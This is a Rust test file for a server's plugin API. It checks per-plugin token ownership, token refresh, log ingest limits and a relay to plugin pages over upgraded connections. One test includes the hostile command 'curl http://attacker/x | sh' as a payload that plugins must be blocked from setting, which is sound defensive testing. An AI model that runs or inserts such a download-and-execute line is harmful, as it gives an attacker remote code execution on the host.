//! Plugin tokens and ownership, the registry, log ingest and the page relay.

use super::*;

/// The hole per-plugin tokens close: with one shared token, any plugin could overwrite another's
/// registration — and then answer for its tiles. A plugin that proved which plugin it is may
/// write its own id and nothing else.
#[tokio::test]
async fn a_plugin_may_write_only_its_own_id() {
    let app = test_app(test_state(), None);
    let put = |id: &str, token: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri(format!("/api/v1/plugins/{id}"))
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(
                serde_json::json!({ "title": "Demo" }).to_string(),
            ))
            .unwrap()
    };
    // Its own id: accepted.
    let (status, _) = send(&app, put("demo", "demo-secret")).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    // Another plugin's: refused, whatever the payload says.
    let (status, body) = send(&app, put("rom-manager", "demo-secret")).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    // Deregistering someone else is the same question.
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/v1/plugins/rom-manager")
            .header("authorization", "Bearer demo-secret")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
}

/// Authentication reads the shared map on every request, so a store job can publish a token
/// before restarting the runner without rebuilding the management router.
#[tokio::test]
async fn a_refreshed_plugin_token_takes_effect_live() {
    let state = test_state();
    let stats = state.stats.clone();
    let tokens = shared_plugin_tokens(std::collections::BTreeMap::from([(
        "demo".to_string(),
        "old-secret".to_string(),
    )]));
    let app = app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        tokens.clone(),
        Some(TRAY_TOKEN.to_string()),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        false,
        None,
        false,
        false,
    );
    *tokens
        .write()
        .unwrap_or_else(|poisoned| poisoned.into_inner()) =
        std::collections::BTreeMap::from([("demo".to_string(), "new-secret".to_string())]);
    let put = |token: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/plugins/demo")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(r#"{"title":"Demo"}"#))
            .unwrap()
    };
    assert_eq!(
        send(&app, put("old-secret")).await.0,
        StatusCode::UNAUTHORIZED
    );
    assert_eq!(
        send(&app, put("new-secret")).await.0,
        StatusCode::NO_CONTENT
    );
}

/// `plugins add` mints in another process: a token only the file knows authenticates, as that
/// plugin, on its first request.
#[tokio::test]
async fn a_token_minted_by_another_process_authenticates() {
    let dir = tempfile::tempdir().unwrap();
    let run = dir.path().join(crate::plugins::RUNNER_DATA_DIR);
    std::fs::create_dir_all(&run).unwrap();
    std::fs::write(run.join("plugin-tokens.json"), r#"{"fresh":"cli-secret"}"#).unwrap();
    let app = test_app_access(test_state(), dir.path());
    let put = |id: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri(format!("/api/v1/plugins/{id}"))
            .header("content-type", "application/json")
            .header("authorization", "Bearer cli-secret")
            .body(Body::from(r#"{"title":"Fresh"}"#))
            .unwrap()
    };
    assert_eq!(send(&app, put("fresh")).await.0, StatusCode::NO_CONTENT);
    assert_eq!(send(&app, put("demo")).await.0, StatusCode::FORBIDDEN);

    // `plugins remove` revokes in another process too: the token stops working at once.
    std::fs::write(run.join("plugin-tokens.json"), "{}").unwrap();
    assert_eq!(send(&app, put("fresh")).await.0, StatusCode::UNAUTHORIZED);
}

/// Same rule on the library side: a provider's entries belong to the plugin that owns the id.
#[tokio::test]
async fn a_plugin_may_reconcile_only_its_own_provider() {
    let app = test_app(test_state(), None);
    let (status, body) = send(
        &app,
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/library/provider/steam")
            .header("content-type", "application/json")
            .header("authorization", "Bearer demo-secret")
            .body(Body::from("[]"))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/v1/library/provider/steam")
            .header("authorization", "Bearer demo-secret")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
}

/// Every plugin-scoped write refuses another plugin's id before it reads the body, and
/// checks the id's shape only for a caller that may write it.
#[tokio::test]
async fn every_plugin_scoped_write_checks_the_owner_first() {
    let app = test_app(test_state(), None);
    let req = |method: &str, path: &str, token: &str| {
        with_bearer(
            axum::http::Request::builder()
                .method(method)
                .uri(format!("/api/v1{path}"))
                .header("content-type", "application/json")
                .body(Body::from("{not json"))
                .unwrap(),
            token,
        )
    };
    for (method, path) in [
        ("PUT", "/library/scanners/steam"),
        ("PUT", "/library/provider/steam"),
        ("DELETE", "/library/provider/steam"),
        ("PUT", "/library/provider/steam/running"),
        ("PUT", "/library/metadata/steam"),
        ("DELETE", "/library/metadata/steam"),
        ("PUT", "/plugins/rom-manager"),
        ("DELETE", "/plugins/rom-manager"),
    ] {
        let (status, body) = send(&app, req(method, path, "demo-secret")).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {path}: {body}");
        assert_eq!(body["error"], "a plugin may only write its own id");
    }
    for (method, path) in [
        ("PUT", "/library/provider/manual"),
        ("DELETE", "/library/provider/manual"),
        ("PUT", "/library/metadata/manual"),
        ("DELETE", "/library/metadata/manual"),
        ("PUT", "/plugins/Not_Kebab"),
    ] {
        let (status, body) = send(&app, req(method, path, "plugin-secret")).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{method} {path}: {body}");
        assert!(
            body["error"].as_str().unwrap().contains("id"),
            "the id is refused, not the body: {body}"
        );
    }
    // Deregistering takes any id: an unknown one is already gone.
    let (status, _) = send(&app, req("DELETE", "/plugins/Not_Kebab", "plugin-secret")).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
}

/// The runner's shared token keeps the older, unowned behaviour — a loose script has no plugin
/// identity to check — so upgrading a host does not strand one.
#[tokio::test]
async fn the_shared_runner_token_stays_unowned() {
    let app = test_app(test_state(), None);
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/plugins/anything")
            .header("content-type", "application/json")
            .header("authorization", "Bearer plugin-secret")
            .body(Body::from(
                serde_json::json!({ "title": "Demo" }).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
}

/// Register → list (no secret) → credential (secret) → deregister. The listing must never
/// carry the UI secret.
#[tokio::test]
async fn plugin_registry_roundtrip() {
    let app = test_app(test_state(), None);
    let id = "test-plugin-roundtrip";
    let secret = "s3cr3t-abcdefghijkl"; // 19 chars, valid [A-Za-z0-9_-]

    let (status, _) = send(
        &app,
        json_req(
            Method::PUT,
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({
                "title": "Test Plugin",
                "ui": { "port": 49321, "secret": secret, "icon": "gamepad-2" }
            }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert_eq!(status, StatusCode::OK);
    let mine = body
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["id"] == id)
        .expect("registered plugin is listed");
    assert_eq!(mine["title"], "Test Plugin");
    assert_eq!(mine["ui"]["port"], 49321);
    assert_eq!(mine["ui"]["icon"], "gamepad-2");
    assert!(
        !body.to_string().contains(secret),
        "the listing must never carry the UI secret"
    );

    let (status, body) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["secret"], secret);
    assert_eq!(body["port"], 49321);

    let (status, _) = send(
        &app,
        axum::http::Request::delete(format!("/api/v1/plugins/{id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (_, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert!(
        body.as_array().unwrap().iter().all(|p| p["id"] != id),
        "deregistered plugin must not list"
    );
    let (status, _) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    // Port 80 is privileged; registration must 400.
    let (status, _) = send(
        &app,
        json_req(
            Method::PUT,
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({ "title": "x", "ui": { "port": 80, "secret": secret } }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// Ingest lands on the same ring `GET /logs` serves, tagged for the console filter.
/// One request must not be able to evict the ring.
#[tokio::test]
async fn plugin_log_ingest_lands_in_the_ring() {
    let app = test_app(test_state(), None);
    let marker = "vh-ingest-marker-3f9a";

    let (status, _) = send(
        &app,
        json_req(Method::POST,
            "/api/v1/plugins/logs",
            serde_json::json!({"entries": [
                {"ts_ms": 1_700_000_000_123u64, "level": "warn", "source": "virtualhere", "msg": marker},
                // Empty source is attributed to the runner, not to nothing.
                {"ts_ms": 1_700_000_000_124u64, "level": "NOTICE", "source": "", "msg": "orphan"},
            ]}),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, body) = send(&app, get_req("/api/v1/logs?limit=1000")).await;
    assert_eq!(status, StatusCode::OK);
    let entries = body["entries"].as_array().unwrap();

    let mine = entries
        .iter()
        .find(|e| e["msg"] == marker)
        .expect("ingested line is served by GET /logs");
    // `plugin:` is the console Host/Plugins filter key.
    assert_eq!(mine["target"], "plugin:virtualhere");
    // Lowercase in, canonical out; the console ranks these five levels only.
    assert_eq!(mine["level"], "WARN");
    // Stamped when the line happened, not when the batch arrived.
    assert_eq!(mine["ts_ms"], 1_700_000_000_123u64);

    let orphan = entries.iter().find(|e| e["msg"] == "orphan").unwrap();
    assert_eq!(orphan["target"], "plugin:runner");
    // Unranked levels would sort as 0 and hide under every console filter setting.
    assert_eq!(orphan["level"], "INFO");

    // Oversized batch is refused whole, not half-ingested.
    let big: Vec<serde_json::Value> = (0..300)
        .map(|i| serde_json::json!({"ts_ms": 1u64, "level": "INFO", "source": "x", "msg": format!("f{i}")}))
        .collect();
    let (status, _) = send(
        &app,
        json_req(
            Method::POST,
            "/api/v1/plugins/logs",
            serde_json::json!({"entries": big}),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// The plugin lane may hit the library write routes, but `prep` and a `command` launch
/// execute as the host user (`/bin/sh -c` / `cmd.exe /c`). Those fields are operator-only.
#[tokio::test]
async fn plugin_lane_cannot_set_command_execution_fields() {
    let app = test_app(test_state(), None);

    let as_lane = |token: &str, method: &str, path: &str, body: serde_json::Value| {
        axum::http::Request::builder()
            .method(method)
            .uri(path)
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let prep = serde_json::json!({
        "title": "Pwned",
        "prep": [{"do": "curl http://attacker/x | sh"}],
    });
    let command = serde_json::json!({
        "title": "Pwned",
        "launch": {"kind": "command", "value": "curl http://attacker/x | sh"},
    });
    for (path, method) in [
        ("/api/v1/library/custom", "POST"),
        ("/api/v1/library/custom/some-id", "PUT"),
    ] {
        for body in [&prep, &command] {
            let (status, err) =
                send(&app, as_lane("plugin-secret", method, path, body.clone())).await;
            assert_eq!(
                status,
                StatusCode::FORBIDDEN,
                "plugin token must not set an executed field via {method} {path}"
            );
            assert!(
                err["error"].as_str().unwrap().contains("host user"),
                "the refusal should say why: {err}"
            );
        }
    }
    // Reconcile replaces the whole set; a privileged field on any entry, not just the first, is refused.
    let sneaky = serde_json::json!([
        {"external_id": "a", "title": "Innocent"},
        {"external_id": "b", "title": "Pwned",
         "launch": {"kind": "command", "value": "curl http://attacker/x | sh"}},
    ]);
    let (status, _) = send(
        &app,
        as_lane(
            "plugin-secret",
            "PUT",
            "/api/v1/library/provider/romm",
            sneaky,
        ),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "a privileged field anywhere in a reconcile payload must be refused"
    );

    // Refusals happen before the catalog is touched. Operator-lane converse:
    // `library::tests::privileged_field_is_command_execution_only`.
    assert!(
        crate::mgmt::auth::AuthLane::Admin.may_set_privileged_fields(),
        "the operator's token is the lane these fields belong to"
    );
    assert!(!crate::mgmt::auth::AuthLane::Plugin.may_set_privileged_fields());
    assert!(!crate::mgmt::auth::AuthLane::Cert.may_set_privileged_fields());
}

/// A page's root and its paths both reach the channel relay: a route miss would be an empty 404.
#[tokio::test]
async fn the_relay_takes_a_page_root_and_its_paths() {
    let app = test_app(test_state(), None);
    for path in ["/api/v1/plugins/demo/ui/", "/api/v1/plugins/demo/ui/app.js"] {
        let (status, json) = send(&app, get_req(path)).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{path}");
        assert_eq!(
            json["error"], "no live plugin UI channel with that id",
            "{path}"
        );
    }
}

/// The plugin end of a connection that `id` has parked at the host with an upgrade.
async fn attach_channel(app: Router, id: &str) -> tokio::io::DuplexStream {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let (mut plugin, host_io) = tokio::io::duplex(1 << 16);
    tokio::spawn(crate::https::serve_conn(
        host_io,
        app,
        PeerCertFingerprint(None),
        PeerAddr("127.0.0.1:1".parse().unwrap()),
        None,
        Some(crate::https::PipePlugin(id.into())),
    ));
    let attach = format!(
        "GET /api/v1/plugins/{id}/ui/attach HTTP/1.1\r\nhost: punktfunk.host\r\n\
         connection: upgrade\r\nupgrade: punktfunk-ui\r\n\r\n"
    );
    plugin.write_all(attach.as_bytes()).await.unwrap();
    let mut buf = [0u8; 4096];
    let n = plugin.read(&mut buf).await.unwrap();
    let head = String::from_utf8_lossy(&buf[..n]);
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    plugin
}

/// Read one request head off a parked connection and answer it with a small JSON body.
async fn answer_one(plugin: &mut tokio::io::DuplexStream) -> String {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut buf = [0u8; 4096];
    let mut request = Vec::new();
    while !request.windows(4).any(|w| w == b"\r\n\r\n") {
        let n = plugin.read(&mut buf).await.unwrap();
        assert!(n > 0, "the channel closed before a request came down it");
        request.extend_from_slice(&buf[..n]);
    }
    plugin
        .write_all(
            b"HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\n\
              connection: close\r\n\r\n{\"ok\":true}",
        )
        .await
        .unwrap();
    String::from_utf8_lossy(&request).to_ascii_lowercase()
}

/// A plugin on its own pipe parks a connection with an upgrade; a request for its page goes down
/// that connection as plain HTTP carrying the plugin's secret, and its answer comes back.
#[tokio::test(flavor = "multi_thread")]
async fn a_plugin_page_is_reached_over_its_parked_channel() {
    let mut plugin = attach_channel(test_app(test_state(), None), "demo").await;
    let sent = tokio::spawn(async move {
        let mut headers = axum::http::HeaderMap::new();
        headers.insert("x-forwarded-prefix", "/plugin-ui/demo".parse().unwrap());
        crate::mgmt::plugin_channel::send(
            "demo",
            "s3cret",
            axum::http::Method::GET,
            "/__health",
            &headers,
            Body::empty(),
        )
        .await
    });
    let text = answer_one(&mut plugin).await;
    assert!(text.starts_with("get /__health http/1.1\r\n"), "{text}");
    assert!(text.contains("authorization: bearer s3cret"), "{text}");
    assert!(
        text.contains("x-forwarded-prefix: /plugin-ui/demo"),
        "{text}"
    );
    assert!(!text.contains("upgrade:"), "{text}");
    let resp = sent.await.unwrap().expect("the page answered");
    assert_eq!(resp.status(), 200);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    assert_eq!(&body[..], b"{\"ok\":true}");
}

/// A restarted plugin leaves its old connections parked; the page is served by the new one.
#[tokio::test(flavor = "multi_thread")]
async fn a_restarted_plugins_old_channel_is_skipped() {
    let app = test_app(test_state(), None);
    let gone = attach_channel(app.clone(), "restarted").await;
    // Let the upgrade task park it before its plugin goes away.
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    drop(gone);
    let mut plugin = attach_channel(app, "restarted").await;
    let sent = tokio::spawn(async move {
        crate::mgmt::plugin_channel::send(
            "restarted",
            "s3cret",
            axum::http::Method::GET,
            "/__health",
            &axum::http::HeaderMap::new(),
            Body::empty(),
        )
        .await
    });
    let text = tokio::time::timeout(std::time::Duration::from_secs(5), answer_one(&mut plugin))
        .await
        .expect("the request went to the plugin that is gone");
    assert!(text.starts_with("get /__health http/1.1\r\n"), "{text}");
    let resp = sent.await.unwrap().expect("the live connection answered");
    assert_eq!(resp.status(), 200);
}
